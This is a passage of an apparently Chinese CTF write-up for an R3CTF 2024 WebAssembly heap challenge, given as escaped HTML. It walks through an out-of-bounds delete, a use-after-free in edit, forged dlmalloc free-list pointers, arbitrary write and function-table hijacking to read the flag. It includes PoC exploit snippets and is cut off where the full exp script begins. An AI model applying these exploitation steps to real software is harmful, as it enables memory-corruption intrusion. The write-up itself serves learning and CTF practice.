&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create(0x20, b&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(0x20, b&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(107)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/143978de12caa7f17007d86c34fa0775.png&#34; alt=&#34;143978de12caa7f17007d86c34fa0775&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现触发了一个 crash &lt;/p&gt;
&lt;p&gt;因为是 delete 触发的 crash，一开始是想看看 rsi 是怎么来的，但是回溯发现 rsi 是来自于函数的调用参数，上一个函数比较难看，所以就直接 search 搜索&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;search -4 0xfffffffb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;但是搜索结果比较多，于是换成 delete(109) 也能触发 crash&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/a8c0305cef868332cbb35f88482ea9fb.png&#34; alt=&#34;a8c0305cef868332cbb35f88482ea9fb&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;search -4 0x555475c4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;但是没搜到结果，继续看汇编&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/6862db955ade739d725e27f8749c3023.png&#34; alt=&#34;6862db955ade739d725e27f8749c3023&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 rsi 取值之前 - 4 了，所以要 + 4 搜索&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/3d9af66e33733ecfe85b3e3173430ee0.png&#34; alt=&#34;3d9af66e33733ecfe85b3e3173430ee0&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以找到两个结果，其中一共结果会发现 - 0x8 处，是 0xffffffff ，结合 delete(107) 的 crash 的结果，可以判断这处内存是正确的，再接着看下 index 为 0 处的内存&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/82ac999c3b2f04130f738d260d3e8f9d.png&#34; alt=&#34;82ac999c3b2f04130f738d260d3e8f9d&#34;&gt;&lt;/p&gt;
&lt;p&gt;从这里可以看出， 0x14c0 处是存放的 heap_ptr ，而他们共同的基址是 &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/6f6e14037d485760b3dc7febc029132d.png&#34; alt=&#34;6f6e14037d485760b3dc7febc029132d&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中从 ida 里面也是可以看出&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/8967c3171a37781e9b7fb82e6e53dde1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是这之后我们也明确了 w2c_memory 是指向基址的，到这里就对 wasm 的堆寻址有了一个大概的认识&lt;/p&gt;
&lt;p&gt;但是通过 delete 越界漏洞并不能完成利用，这里其实还有另外一个漏洞，因为不能够准确打断点，为了方便调试，先把 alsr 关闭&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;poc&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create(0x20, b&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(0x20, b&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(0, b&amp;#x27;a&amp;#x27;*0x40 + b&amp;#x27;\n&amp;#x27;) # delete(0)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/c010132e4245d6ac8d69bf450c5ac68a.png&#34; alt=&#34;c010132e4245d6ac8d69bf450c5ac68a&#34;&gt;&lt;/p&gt;
&lt;p&gt;当 edit 数据超过原本堆块大小时候，堆块会被 free，但是 heap_ptr 上的指针并没有更新，这个漏洞导致了 uaf&lt;/p&gt;
&lt;p&gt;继续看 0x16a8 的指向内存，明显这处内存和 ptmalloc 的 main_arena 差不多，实现了双向链表&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/8b015b4be4429790e78e98b6add6f59c.png&#34; alt=&#34;8b015b4be4429790e78e98b6add6f59c&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于 wasmtime 是利用的 dlmalloc，所以攻击方式会不太一样，这里如果我们去修改 fd 的话，那么就可以进行任意地址分配&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# delete(0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, p32(&lt;span class=&#34;number&#34;&gt;0x300&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# free chunk fd -&amp;gt; 0x300&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# set fake_fd -&amp;gt; main_arena&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# alloc base + 0x300&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;第一次 create 时候&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/af46a1f05fa71a54d8802dba8ef8f830.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二次 create 时候，成功分配到了 0x308&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/93e9cca2167b6b9c0c4300166c11f012.png&#34; alt=&#34;93e9cca2167b6b9c0c4300166c11f012&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么就可以通过这个，去分配到 heap_ptr 上面，实现无限的任意地址写&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, p32(&lt;span class=&#34;number&#34;&gt;0x14c0&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;接着就是劫持程序执行流了，如果去看上面处理得到 wat.wasm 文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/295370583bdcaa71025fe72b8801fc51.png&#34; alt=&#34;295370583bdcaa71025fe72b8801fc51&#34;&gt;&lt;/p&gt;
&lt;p&gt;会发现其定义了函数表，并且将 59 61 63 64 86 13 这六个函数保存到表中，下面的则是加载所要用到的数据，可以看到 banner.txt&lt;/p&gt;
&lt;p&gt;其中 banner.txt 和 r，应该是文件名和文件打开方式，如果在 gdb 里面看的话，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/f819d355f0cd685effa76b630a5891e4.png&#34; alt=&#34;f819d355f0cd685effa76b630a5891e4&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现数据偏移是 0x400，而 banner.txt 和 r 的偏移是 0x424 和 0x42f ，那么如果转化为十进制 1060 和 1071 在 wat.wasm 文件中查找的话&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/4644a27884a9da607658da431b85ce9f.png&#34; alt=&#34;4644a27884a9da607658da431b85ce9f&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现有处地方调用了这两个值&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/4eb381c38a7be5edbf52c986af26ffd2.png&#34; alt=&#34;4eb381c38a7be5edbf52c986af26ffd2&#34;&gt;&lt;/p&gt;
&lt;p&gt;往上找可以发现是 func 13 ，是表中第 6 个函数&lt;/p&gt;
&lt;p&gt;但是是没法从文件和 ida 中看到函数表地址的，如果是保存在  w2c_memory 内存中，那么直接覆盖足够多的数据，令其 crash 即可&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;create(0x40, b&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(0x40, b&amp;#x27;a&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(0, b&amp;#x27;a&amp;#x27;*0x60 + b&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(0, p32(0x14c0 - 0x30 - 8) + b&amp;#x27;\n&amp;#x27;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(0x40, b&amp;#x27;\x00&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(0x40, b&amp;#x27;\x00&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(3, p64(0)*6 + p32(0x14c0) + p32(0x300) + b&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(1, b&amp;#x27;a&amp;#x27;*0x800 + b&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(1, b&amp;#x27;a&amp;#x27;*0x800 + b&amp;#x27;\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;会 crash 在这里&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/07299603958a35d6a98b8263039495ce.png&#34; alt=&#34;07299603958a35d6a98b8263039495ce&#34;&gt;&lt;/p&gt;
&lt;p&gt;比较符合出题人给出的 exp 中的修改 0x14 和 0x20&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/568edd5d69f8369c2c37d93668e961c1.png&#34; alt=&#34;568edd5d69f8369c2c37d93668e961c1&#34;&gt;&lt;/p&gt;
&lt;p&gt;我试了下，如果 0x14 ！&amp;#x3D; 0 ，那么就会取出 0x20 的值，然后去找出函数表执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/916d26bfe25c8e0406dd377a1f976cdf.png&#34; alt=&#34;916d26bfe25c8e0406dd377a1f976cdf&#34;&gt;&lt;/p&gt;
&lt;p&gt;判断师傅小于函数表的大小 7 后，接着 call 一个可以返回对应函数指针和参数的堆地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/4264af0d7758b92819a0b9f4bc06161f.png&#34; alt=&#34;4264af0d7758b92819a0b9f4bc06161f&#34;&gt;&lt;/p&gt;
&lt;p&gt;是执行 wasmtime 中对应从表取值函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/092950c0d35800e8c95ac76bc70d95bf.png&#34; alt=&#34;092950c0d35800e8c95ac76bc70d95bf&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后执行取出的函数，但是没根据这个分析出函数表的地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/1d91c8a2a8e5accf2a5e9b21b2718778.png&#34; alt=&#34;1d91c8a2a8e5accf2a5e9b21b2718778&#34;&gt;&lt;/p&gt;
&lt;p&gt;不过可以从 crash 处判断，会发现图红框处是存放编译后的 wasm 代码，可以以这个为基址，打断点到 crash 处&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/4670033147e2f19bfbf4b52c7b6820ed.png&#34; alt=&#34;4670033147e2f19bfbf4b52c7b6820ed&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现正常情况下，偏移是 0x1228 &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/506b91353437123d54690316fc9587af.png&#34; alt=&#34;506b91353437123d54690316fc9587af&#34;&gt;&lt;/p&gt;
&lt;p&gt;于是只需要修改 banner.txt 为 flag.txt ，同时修改 0x1228 处的内存，令其跳转执行 orw 输出 flag 即可&lt;/p&gt;
&lt;p&gt;效果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/07/29/2024_R3CTF_part1/99992aadbb3c59c434c8d7a03839967e.png&#34; alt=&#34;99992aadbb3c59c434c8d7a03839967e&#34;&gt;&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 